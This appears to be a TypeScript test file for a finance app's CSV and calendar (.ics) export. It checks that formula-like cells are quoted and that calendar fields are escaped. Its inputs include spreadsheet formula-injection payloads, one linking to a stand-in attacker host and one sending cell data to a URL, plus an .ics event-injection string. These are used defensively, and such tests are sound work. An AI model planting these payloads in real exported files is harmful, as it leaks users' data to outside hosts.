import { after, before, describe, test } from 'node:test'
import assert from 'node:assert/strict'
import * as db from '../src/main/db.ts'
import { calendarIcs, foldIcs, icsText } from '../src/main/calendar.ts'
import { exportRow, safeCell, transactionsCsv, type ExportRow } from '../src/main/csvExport.ts'

// What leaves the app as a file can't carry instructions for the program that
// opens it: a CSV cell that starts like a formula is quoted, an .ics value is
// escaped and folded.

const row = (over: Partial<ExportRow>): ExportRow => ({
  id: 't',
  accountId: 'a',
  accountName: 'Checking',
  posted: 1_760_000_000,
  amountCents: -4500,
  description: 'Starbucks',
  merchant: null,
  categoryId: null,
  categorySource: null,
  confidence: null,
  pending: false,
  notes: null,
  bucketId: null,
  oneTime: false,
  splits: [],
  tags: [],
  categoryName: null,
  bucketName: null,
  ...over
})

describe('CSV export', () => {
  test('a text cell that starts like a formula is quoted; numbers and dates are not', () => {
    assert.equal(safeCell('=HYPERLINK("http://evil.example","Starbucks")'), '\'=HYPERLINK("http://evil.example","Starbucks")')
    assert.equal(safeCell('+1 (555) 123'), '\'+1 (555) 123')
    assert.equal(safeCell('-Starbucks'), '\'-Starbucks')
    assert.equal(safeCell('@home'), '\'@home')
    assert.equal(safeCell('\tx'), '\'\tx')
    assert.equal(safeCell('Starbucks'), 'Starbucks')
    const r = exportRow(row({ description: '=WEBSERVICE("https://x/?"&A1)', notes: '-memo', merchant: '+Shop', amountCents: -4500 }))
    assert.equal(r.amount, '-45.00')
    assert.equal(r.date, '2025-10-09')
    assert.equal(r.description, '\'=WEBSERVICE("https://x/?"&A1)')
    assert.equal(r.notes, '\'-memo')
    assert.equal(r.merchant, '\'+Shop')
  })

  test('the whole file', () => {
    const csv = transactionsCsv([row({ description: '=1+1' }), row({ id: 'u', description: 'Plain', amountCents: 1000 })])
    const lines = csv.split(/\r?\n/)
    assert.equal(lines[0], 'date,account,merchant,description,category,bucket,amount,pending,notes,tags,id')
    assert.match(lines[1], /,'=1\+1,/)
    assert.match(lines[2], /,Plain,,Personal,10\.00,,,,u$/)
  })

  test('a row with an unreadable date exports with a blank date instead of failing', () => {
    assert.equal(exportRow(row({ posted: Number.NaN })).date, '')
  })
})

describe('.ics export', () => {
  test('values are escaped and control characters stripped', () => {
    assert.equal(icsText('a,b;c\nd\r\ne\u0007f\\g'), 'a\\,b\\;c\\nd\\nef\\\\g')
    assert.equal(icsText('DESCRIPTION:x\r\nATTENDEE:mailto:a@b'), 'DESCRIPTION:x\\nATTENDEE:mailto:a@b')
  })

  test('long lines fold at 75 octets with a leading space', () => {
    const folded = foldIcs(`SUMMARY:${'é'.repeat(60)}`)
    const lines = folded.split('\r\n')
    assert.ok(lines.length > 1)
    assert.ok(lines.every((l) => Buffer.byteLength(l) <= 75), 'every line fits')
    assert.ok(lines.slice(1).every((l) => l.startsWith(' ')), 'continuations start with a space')
    assert.equal(lines.map((l, i) => (i ? l.slice(1) : l)).join(''), `SUMMARY:${'é'.repeat(60)}`)
    assert.equal(foldIcs('short'), 'short')
  })

  describe('the whole calendar', () => {
    before(() => db.openDb(':memory:'))
    after(db.closeDb)

    test('a reminder with line breaks and a very long title comes out as valid lines', () => {
      const day = new Date()
      day.setDate(day.getDate() + 3)
      const key = `${day.getFullYear()}-${String(day.getMonth() + 1).padStart(2, '0')}-${String(day.getDate()).padStart(2, '0')}`
      db.addCalendarEvent({ day: key, title: `Pay the ${'very '.repeat(30)}long bill`, notes: 'policy 123\r\nEND:VEVENT\r\nBEGIN:VEVENT', createdBy: 'user' })
      const ics = calendarIcs()
      const lines = ics.split('\r\n')
      for (const line of lines) assert.ok(Buffer.byteLength(line) <= 75, `line too long: ${line}`)
      // The note's "END:VEVENT" stays inside the description: one event, not two.
      assert.equal(lines.filter((l) => l === 'BEGIN:VEVENT').length, 1)
      assert.equal(lines.filter((l) => l === 'END:VEVENT').length, 1)
      assert.match(ics, /DESCRIPTION:policy 123\\nEND:VEVENT\\nBEGIN:VEVENT/)
    })
  })
})
